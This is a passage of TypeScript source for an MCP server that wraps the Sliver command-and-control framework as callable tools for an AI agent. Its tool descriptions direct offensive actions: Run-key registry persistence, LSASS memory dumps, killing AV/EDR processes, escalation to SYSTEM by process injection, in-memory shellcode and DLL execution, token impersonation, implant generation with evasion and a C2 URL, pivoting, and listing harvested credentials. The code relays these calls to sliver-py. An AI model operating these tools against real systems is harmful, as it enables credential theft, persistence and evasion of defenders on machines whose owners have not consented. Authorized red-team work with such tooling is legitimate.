    description: "Get network interfaces on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_registry_read",
    description: "Read a Windows registry value from a beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM, HKCR, HKU, HKCC", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name (e.g. WindowsUpdate)" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "path", "key"],
    },
  },
  {
    name: "sliver_beacon_registry_write",
    description: "Write a Windows registry value on a beacon target (async). For persistence: hive=HKCU, path=Software/Microsoft/Windows/CurrentVersion/Run, reg_type=REG_SZ.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name (e.g. WindowsUpdate)" },
        string_value: { type: "string", description: "String value to write (for REG_SZ)", default: "" },
        dword_value: { type: "number", description: "DWORD value (for REG_DWORD)", default: 0 },
        reg_type: { type: "string", description: "REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_QWORD, REG_BINARY", default: "REG_SZ" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "path", "key"],
    },
  },
  {
    name: "sliver_registry_read",
    description: "Read a Windows registry value via session (synchronous).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM, HKCR", default: "HKCU" },
        path: { type: "string", description: "Registry path (e.g. Software/Microsoft/Windows/CurrentVersion/Run)" },
        key: { type: "string", description: "Value name" },
      },
      required: ["session_id", "path", "key"],
    },
  },
  {
    name: "sliver_registry_write",
    description: "Write a Windows registry value via session (synchronous). For persistence: hive=HKCU, path=Software/Microsoft/Windows/CurrentVersion/Run, reg_type=REG_SZ.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        hive: { type: "string", description: "Registry hive: HKCU, HKLM", default: "HKCU" },
        path: { type: "string", description: "Registry path" },
        key: { type: "string", description: "Value name" },
        string_value: { type: "string", description: "String value (REG_SZ)", default: "" },
        dword_value: { type: "number", description: "DWORD value", default: 0 },
        reg_type: { type: "string", description: "REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_BINARY", default: "REG_SZ" },
      },
      required: ["session_id", "path", "key"],
    },
  },
  {
    name: "sliver_beacon_execute_assembly",
    description: "Execute a .NET assembly in-memory on a beacon target (async). Use for armory tools like Seatbelt, SharpUp, etc.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        assembly_path: { type: "string", description: "Local path to .NET assembly (.exe or .dll)" },
        arguments: { type: "string", description: "Arguments string passed to the assembly", default: "" },
        process: { type: "string", description: "Host process to inject into (default: notepad.exe)", default: "notepad.exe" },
        is_dll: { type: "boolean", description: "Is the assembly a DLL", default: false },
        arch: { type: "string", description: "Architecture: x86_64 or x86", default: "x86_64" },
        class_name: { type: "string", description: "Class name (for DLL only)", default: "" },
        method: { type: "string", description: "Method to call (for DLL only)", default: "Main" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "assembly_path"],
    },
  },
  {
    name: "sliver_execute_assembly",
    description: "Execute a .NET assembly in-memory via session (synchronous). Use for armory tools like Seatbelt, SharpUp, etc.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        assembly_path: { type: "string", description: "Local path to .NET assembly (.exe or .dll)" },
        arguments: { type: "string", description: "Arguments string", default: "" },
        process: { type: "string", description: "Host process (default: notepad.exe)", default: "notepad.exe" },
        is_dll: { type: "boolean", description: "Is a DLL", default: false },
        arch: { type: "string", description: "x86_64 or x86", default: "x86_64" },
        class_name: { type: "string", description: "Class name (DLL only)", default: "" },
        method: { type: "string", description: "Method (DLL only)", default: "Main" },
      },
      required: ["session_id", "assembly_path"],
    },
  },
  {
    name: "sliver_rename_beacon",
    description: "Rename a beacon for better OPSEC/organization.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        name: { type: "string", description: "New name for the beacon" },
      },
      required: ["beacon_id", "name"],
    },
  },
  {
    name: "sliver_beacon_tasks",
    description: "List pending and completed tasks for a beacon.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_prune_beacons",
    description: "Delete all dead/overdue beacons from the server. Equivalent to 'beacons prune' in Sliver console.",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_generate",
    description: "Generate a new implant/beacon payload. Saves binary to local disk. Use save_path ending in .exe for Windows.",
    inputSchema: {
      type: "object",
      properties: {
        c2: {
          type: "array",
          items: { type: "string" },
          description: "C2 URLs (e.g. [\"https://c2.proxmoxlab.cloud\"])",
        },
        save_path: { type: "string", description: "Local path to save generated binary (e.g. /tmp/beacon.exe)" },
        goos: { type: "string", description: "Target OS: windows, linux, darwin", default: "windows" },
        goarch: { type: "string", description: "Target arch: amd64, 386, arm64", default: "amd64" },
        is_beacon: { type: "boolean", description: "true=beacon (async), false=session (interactive)", default: true },
        format: { type: "string", description: "EXECUTABLE, SHARED_LIB, SHELLCODE, SERVICE", default: "EXECUTABLE" },
        name: { type: "string", description: "Custom implant name (optional)", default: "" },
        beacon_interval: { type: "number", description: "Beacon check-in interval in seconds (default: 60)", default: 60 },
        beacon_jitter: { type: "number", description: "Jitter in seconds (default: 30)", default: 30 },
        evasion: { type: "boolean", description: "Enable evasion features", default: false },
      },
      required: ["c2", "save_path"],
    },
  },

  // ── Terminate ──────────────────────────────────────────────────────────
  {
    name: "sliver_terminate",
    description: "Kill a remote process (session). Use to stop AV/EDR or target process.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        pid: { type: "number", description: "Process ID to terminate" },
        force: { type: "boolean", description: "Force kill", default: false },
      },
      required: ["session_id", "pid"],
    },
  },
  {
    name: "sliver_beacon_terminate",
    description: "Kill a remote process via beacon (async). Use to stop AV/EDR or target process.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        pid: { type: "number", description: "Process ID to terminate" },
        force: { type: "boolean", description: "Force kill", default: false },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "pid"],
    },
  },

  // ── Process Dump ───────────────────────────────────────────────────────
  {
    name: "sliver_process_dump",
    description: "Dump remote process memory to local file (session). LSASS: pid=lsass PID, save_path=/tmp/lsass.dmp",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        pid: { type: "number", description: "PID of process to dump (e.g. LSASS PID)" },
        save_path: { type: "string", description: "Local path to save dump (default: /tmp/procdump.bin)", default: "/tmp/procdump.bin" },
      },
      required: ["session_id", "pid"],
    },
  },
  {
    name: "sliver_beacon_process_dump",
    description: "Dump remote process memory via beacon (async). LSASS dump: find lsass PID first with beacon_ps.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        pid: { type: "number", description: "PID to dump (e.g. LSASS PID)" },
        save_path: { type: "string", description: "Local path to save dump (default: /tmp/procdump.bin)", default: "/tmp/procdump.bin" },
        timeout: { type: "number", description: "Seconds to wait (default: 300)", default: 300 },
      },
      required: ["beacon_id", "pid"],
    },
  },

  // ── Get System (privesc) ───────────────────────────────────────────────
  {
    name: "sliver_get_system",
    description: "Attempt to escalate to SYSTEM via process injection (session, Windows only). Requires LOCAL ADMIN.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID (must be LOCAL ADMIN)" },
        c2: { type: "array", items: { type: "string" }, description: "C2 URL list for injected implant (e.g. [\"https://c2.proxmoxlab.cloud\"])" },
        hosting_process: { type: "string", description: "Process to inject into (default: spoolsv.exe)", default: "spoolsv.exe" },
      },
      required: ["session_id", "c2"],
    },
  },
  {
    name: "sliver_beacon_get_system",
    description: "Attempt to escalate to SYSTEM via beacon (async, Windows only). Requires LOCAL ADMIN.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID (must be LOCAL ADMIN)" },
        c2: { type: "array", items: { type: "string" }, description: "C2 URL list (e.g. [\"https://c2.proxmoxlab.cloud\"])" },
        hosting_process: { type: "string", description: "Host process (default: spoolsv.exe)", default: "spoolsv.exe" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "c2"],
    },
  },

  // ── Execute Shellcode ──────────────────────────────────────────────────
  {
    name: "sliver_execute_shellcode",
    description: "Execute raw shellcode in-memory via session. Provide shellcode as base64 or path to local .bin file.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        shellcode_b64: { type: "string", description: "Shellcode as base64 string (alternative to shellcode_path)" },
        shellcode_path: { type: "string", description: "Local path to raw .bin shellcode (alternative to shellcode_b64)" },
        pid: { type: "number", description: "Target PID to inject into (0 = self)", default: 0 },
        rwx: { type: "boolean", description: "Use RWX memory pages", default: false },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_beacon_execute_shellcode",
    description: "Execute raw shellcode in-memory via beacon (async). Provide base64 or path.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        shellcode_b64: { type: "string", description: "Shellcode as base64" },
        shellcode_path: { type: "string", description: "Local path to .bin shellcode" },
        pid: { type: "number", description: "Target PID (0 = self)", default: 0 },
        rwx: { type: "boolean", description: "Use RWX pages", default: false },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },

  // ── Sideload ───────────────────────────────────────────────────────────
  {
    name: "sliver_sideload",
    description: "Sideload a shared library (.dll/.so) into a remote process via session (in-memory, no disk).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        lib_path: { type: "string", description: "Local path to shared library (.dll/.so)" },
        process_name: { type: "string", description: "Host process name (default: notepad.exe)", default: "notepad.exe" },
        arguments: { type: "string", description: "Arguments passed to DLL", default: "" },
        entry_point: { type: "string", description: "Entry point export name (empty = default)", default: "" },
        kill: { type: "boolean", description: "Kill host process after execution", default: true },
      },
      required: ["session_id", "lib_path"],
    },
  },
  {
    name: "sliver_beacon_sideload",
    description: "Sideload a shared library via beacon (async, in-memory).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        lib_path: { type: "string", description: "Local path to .dll/.so" },
        process_name: { type: "string", description: "Host process (default: notepad.exe)", default: "notepad.exe" },
        arguments: { type: "string", description: "Arguments", default: "" },
        entry_point: { type: "string", description: "Entry point export", default: "" },
        kill: { type: "boolean", description: "Kill host process after", default: true },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "lib_path"],
    },
  },

  // ── Env Vars ───────────────────────────────────────────────────────────
  {
    name: "sliver_get_env",
    description: "Get environment variables from target (session). Leave name empty to get all.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        name: { type: "string", description: "Variable name (empty = all)", default: "" },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_set_env",
    description: "Set an environment variable on target (session).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        name: { type: "string", description: "Variable name" },
        value: { type: "string", description: "Value to set" },
      },
      required: ["session_id", "name", "value"],
    },
  },
  {
    name: "sliver_beacon_get_env",
    description: "Get environment variables from beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        name: { type: "string", description: "Variable name (empty = all)", default: "" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },

  // ── Token Ops ──────────────────────────────────────────────────────────
  {
    name: "sliver_impersonate",
    description: "Impersonate a Windows user token (session). Use after finding token with ps.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        username: { type: "string", description: "Username to impersonate (e.g. DOMAIN\\\\user)" },
      },
      required: ["session_id", "username"],
    },
  },
  {
    name: "sliver_make_token",
    description: "Create an impersonation token with plaintext credentials (session, Windows only).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        username: { type: "string", description: "Username" },
        password: { type: "string", description: "Password" },
        domain: { type: "string", description: "Domain (empty = local)", default: "" },
      },
      required: ["session_id", "username", "password"],
    },
  },
  {
    name: "sliver_revert_to_self",
    description: "Drop impersonation token and revert to original process token (session).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
      },
      required: ["session_id"],
    },
  },

  // ── Beacon File Ops (async parity) ─────────────────────────────────────
  {
    name: "sliver_beacon_cd",
    description: "Change directory on beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        path: { type: "string", description: "Path to change to" },
        timeout: { type: "number", default: 120 },
      },
      required: ["beacon_id", "path"],
    },
  },
  {
    name: "sliver_beacon_pwd",
    description: "Get current directory on beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_mkdir",
    description: "Create directory on beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        path: { type: "string", description: "Directory path to create" },
        timeout: { type: "number", default: 120 },
      },
      required: ["beacon_id", "path"],
    },
  },
  {
    name: "sliver_beacon_file_rm",
    description: "Remove file or directory on beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        path: { type: "string", description: "Path to remove" },
        recursive: { type: "boolean", description: "Remove recursively", default: false },
        timeout: { type: "number", default: 120 },
      },
      required: ["beacon_id", "path"],
    },
  },
  {
    name: "sliver_beacon_netstat",
    description: "Get network connections on beacon target (async).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", default: 120 },
      },
      required: ["beacon_id"],
    },
  },

  // ── Windows Services ───────────────────────────────────────────────────
  {
    name: "sliver_start_service",
    description: "Create and start a Windows service (session). Useful for persistence or lateral movement.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        name: { type: "string", description: "Service name" },
        exe: { type: "string", description: "Path to service executable" },
        description: { type: "string", description: "Service description", default: "" },
        hostname: { type: "string", description: "Target hostname (empty = local)", default: "" },
        arguments: { type: "string", description: "Service arguments", default: "" },
      },
      required: ["session_id", "name", "exe"],
    },
  },
  {
    name: "sliver_stop_service",
    description: "Stop a Windows service (session).",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        name: { type: "string", description: "Service name to stop" },
        hostname: { type: "string", description: "Target hostname (empty = local)", default: "" },
      },
      required: ["session_id", "name"],
    },
  },

  // ── Client Utility ─────────────────────────────────────────────────────
  {
    name: "sliver_rename_session",
    description: "Rename a session for better OPSEC/organization.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: { type: "string", description: "Session ID" },
        name: { type: "string", description: "New name" },
      },
      required: ["session_id", "name"],
    },
  },
  {
    name: "sliver_delete_build",
    description: "Delete an implant build from the server by name. Use sliver_implant_builds to list names.",
    inputSchema: {
      type: "object",
      properties: {
        name: { type: "string", description: "Implant build name to delete" },
      },
      required: ["name"],
    },
  },

  // Pivots
  {
    name: "sliver_pivot_listeners",
    description: "List pivot listeners on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pivot_start_tcp",
    description: "Start a TCP pivot listener on session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 9898)",
          default: 9898,
        },
      },
      required: ["session_id"],
    },
  },

  // Credentials & Hosts
  {
    name: "sliver_creds",
    description: "List harvested credentials",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_hosts",
    description: "List discovered hosts",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
];

// Create the MCP server
const server = new Server(
  {
    name: "sliver-c2-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// Handle tool listing
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return { tools: SLIVER_TOOLS };
});

// Handle tool execution
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    let result: unknown;

    switch (name) {
      case "sliver_version":
        result = await executeSliverCommand("version");
        break;

      case "sliver_operators":
        result = await executeSliverCommand("operators");
        break;

      case "sliver_sessions":
        result = await executeSliverCommand("sessions");
        break;

      case "sliver_kill_session":
        result = await executeSliverCommand("kill_session", args as Record<string, unknown>);
        break;

      case "sliver_beacons":
        result = await executeSliverCommand("beacons");
        break;

      case "sliver_listeners":
        result = await executeSliverCommand("jobs");
        break;

      case "sliver_start_mtls":
        result = await executeSliverCommand("start_mtls_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_https":
        result = await executeSliverCommand("start_https_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_http":
        result = await executeSliverCommand("start_http_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_dns":
        result = await executeSliverCommand("start_dns_listener", args as Record<string, unknown>);
        break;

      case "sliver_start_wg":
        result = await executeSliverCommand("start_wg_listener", args as Record<string, unknown>);
        break;

      case "sliver_kill_listener":
        result = await executeSliverCommand("kill_job", args as Record<string, unknown>);
        break;

      case "sliver_implant_builds":
        result = await executeSliverCommand("implant_builds");
        break;

      case "sliver_implant_profiles":
        result = await executeSliverCommand("implant_profiles");
        break;

      case "sliver_ls":
        result = await executeSliverCommand("session_ls", args as Record<string, unknown>);
        break;

      case "sliver_pwd":
        result = await executeSliverCommand("session_pwd", args as Record<string, unknown>);
        break;

      case "sliver_cd":
        result = await executeSliverCommand("session_cd", args as Record<string, unknown>);
        break;

      case "sliver_mkdir":
        result = await executeSliverCommand("session_mkdir", args as Record<string, unknown>);
        break;

      case "sliver_rm":
        result = await executeSliverCommand("session_rm", args as Record<string, unknown>);
        break;

      case "sliver_download":
        result = await executeSliverCommand("session_download", args as Record<string, unknown>);
        break;

      case "sliver_upload":
        result = await executeSliverCommand("session_upload", args as Record<string, unknown>);
        break;

      case "sliver_execute":
        result = await executeSliverCommand("session_execute", args as Record<string, unknown>);
        break;

      case "sliver_shell":
        result = await executeSliverCommand("session_shell", args as Record<string, unknown>);
        break;

      case "sliver_ps":
        result = await executeSliverCommand("session_ps", args as Record<string, unknown>);
        break;

      case "sliver_ifconfig":
        result = await executeSliverCommand("session_ifconfig", args as Record<string, unknown>);
        break;

      case "sliver_netstat":
        result = await executeSliverCommand("session_netstat", args as Record<string, unknown>);
        break;

      case "sliver_screenshot":
        result = await executeSliverCommand("session_screenshot", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute_bof":
        result = await executeSliverCommand("beacon_execute_bof", args as Record<string, unknown>);
        break;

      case "sliver_beacon_call_extension":
        result = await executeSliverCommand("beacon_call_extension", args as Record<string, unknown>);
        break;

      case "sliver_beacon_open_session":
        result = await executeSliverCommand("beacon_open_session", args as Record<string, unknown>);
        break;

      case "sliver_beacon_rm":
        result = await executeSliverCommand("beacon_delete", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute":
        result = await executeSliverCommand("beacon_execute", args as Record<string, unknown>);
        break;

      case "sliver_beacon_upload":
        result = await executeSliverCommand("beacon_upload", args as Record<string, unknown>);
        break;

      case "sliver_beacon_screenshot":
        result = await executeSliverCommand("beacon_screenshot", args as Record<string, unknown>);
        break;

      case "sliver_beacon_download":
        result = await executeSliverCommand("beacon_download", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ls":
        result = await executeSliverCommand("beacon_ls", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ps":
        result = await executeSliverCommand("beacon_ps", args as Record<string, unknown>);
        break;

      case "sliver_beacon_ifconfig":
        result = await executeSliverCommand("beacon_ifconfig", args as Record<string, unknown>);
        break;

      case "sliver_beacon_registry_read":
        result = await executeSliverCommand("beacon_registry_read", args as Record<string, unknown>);
        break;

      case "sliver_beacon_registry_write":
        result = await executeSliverCommand("beacon_registry_write", args as Record<string, unknown>);
        break;

      case "sliver_registry_read":
        result = await executeSliverCommand("session_registry_read", args as Record<string, unknown>);
        break;

      case "sliver_registry_write":
        result = await executeSliverCommand("session_registry_write", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute_assembly":
        result = await executeSliverCommand("beacon_execute_assembly", args as Record<string, unknown>);
        break;

      case "sliver_execute_assembly":
        result = await executeSliverCommand("session_execute_assembly", args as Record<string, unknown>);
        break;

      case "sliver_rename_beacon":
        result = await executeSliverCommand("rename_beacon", args as Record<string, unknown>);
        break;

      case "sliver_beacon_tasks":
        result = await executeSliverCommand("beacon_tasks", args as Record<string, unknown>);
        break;

      case "sliver_prune_beacons":
        result = await executeSliverCommand("prune_beacons");
        break;

      case "sliver_generate":
        result = await executeSliverCommand("generate_implant", args as Record<string, unknown>);
        break;

      case "sliver_terminate":
        result = await executeSliverCommand("session_terminate", args as Record<string, unknown>);
        break;

      case "sliver_beacon_terminate":
        result = await executeSliverCommand("beacon_terminate", args as Record<string, unknown>);
        break;

      case "sliver_process_dump":
        result = await executeSliverCommand("session_process_dump", args as Record<string, unknown>);
        break;

      case "sliver_beacon_process_dump":
        result = await executeSliverCommand("beacon_process_dump", args as Record<string, unknown>);
        break;

      case "sliver_get_system":
        result = await executeSliverCommand("session_get_system", args as Record<string, unknown>);
        break;

      case "sliver_beacon_get_system":
        result = await executeSliverCommand("beacon_get_system", args as Record<string, unknown>);
        break;

      case "sliver_execute_shellcode":
        result = await executeSliverCommand("session_execute_shellcode", args as Record<string, unknown>);
        break;

      case "sliver_beacon_execute_shellcode":
        result = await executeSliverCommand("beacon_execute_shellcode", args as Record<string, unknown>);
        break;

      case "sliver_sideload":
        result = await executeSliverCommand("session_sideload", args as Record<string, unknown>);
        break;

      case "sliver_beacon_sideload":
        result = await executeSliverCommand("beacon_sideload", args as Record<string, unknown>);
        break;

      case "sliver_get_env":
        result = await executeSliverCommand("session_get_env", args as Record<string, unknown>);
        break;

      case "sliver_set_env":
        result = await executeSliverCommand("session_set_env", args as Record<string, unknown>);
        break;

      case "sliver_beacon_get_env":
        result = await executeSliverCommand("beacon_get_env", args as Record<string, unknown>);
        break;

      case "sliver_impersonate":
        result = await executeSliverCommand("session_impersonate", args as Record<string, unknown>);
        break;

      case "sliver_make_token":
        result = await executeSliverCommand("session_make_token", args as Record<string, unknown>);
        break;

      case "sliver_revert_to_self":
        result = await executeSliverCommand("session_revert_to_self", args as Record<string, unknown>);
        break;

      case "sliver_beacon_cd":
        result = await executeSliverCommand("beacon_cd", args as Record<string, unknown>);
        break;

      case "sliver_beacon_pwd":
        result = await executeSliverCommand("beacon_pwd", args as Record<string, unknown>);
        break;

      case "sliver_beacon_mkdir":
        result = await executeSliverCommand("beacon_mkdir", args as Record<string, unknown>);
        break;

      case "sliver_beacon_file_rm":
        result = await executeSliverCommand("beacon_file_rm", args as Record<string, unknown>);
        break;

      case "sliver_beacon_netstat":
        result = await executeSliverCommand("beacon_netstat", args as Record<string, unknown>);
        break;

      case "sliver_start_service":
        result = await executeSliverCommand("session_start_service", args as Record<string, unknown>);
        break;

      case "sliver_stop_service":
        result = await executeSliverCommand("session_stop_service", args as Record<string, unknown>);
        break;

      case "sliver_rename_session":
        result = await executeSliverCommand("rename_session", args as Record<string, unknown>);
        break;

      case "sliver_delete_build":
        result = await executeSliverCommand("delete_implant_build", args as Record<string, unknown>);
        break;

      case "sliver_pivot_listeners":
        result = await executeSliverCommand("pivot_listeners", args as Record<string, unknown>);
        break;

      case "sliver_pivot_start_tcp":
        result = await executeSliverCommand("pivot_start_tcp", args as Record<string, unknown>);
        break;

      case "sliver_creds":
        result = await executeSliverCommand("creds");
        break;

      case "sliver_hosts":
        result = await executeSliverCommand("hosts");
        break;

      default:
        throw new Error(`Unknown tool: ${name}`);
    }

    const content: TextContent[] = [
      {
        type: "text",
        text: JSON.stringify(result, null, 2),
      },
    ];

    return { content };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      content: [
        {
          type: "text",
          text: `Error: ${errorMessage}`,
        },
      ],
      isError: true,
    };
  }
});

// Main entry point
async function main() {
  // Validate configuration
  if (!config.operatorConfigPath) {
    console.error(
      "Warning: No operator config specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"
    );
  } else if (!existsSync(config.operatorConfigPath)) {
    console.error(`Warning: Operator config file not found: ${config.operatorConfigPath}`);
  }

  // Check if sliver-py is installed
  try {
    execSync(`${config.pythonPath} -c "import sliver"`, { stdio: "pipe" });
  } catch {
    console.error(
      "Warning: sliver-py not installed. Install with: pip install sliver-py"
    );
  }

  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
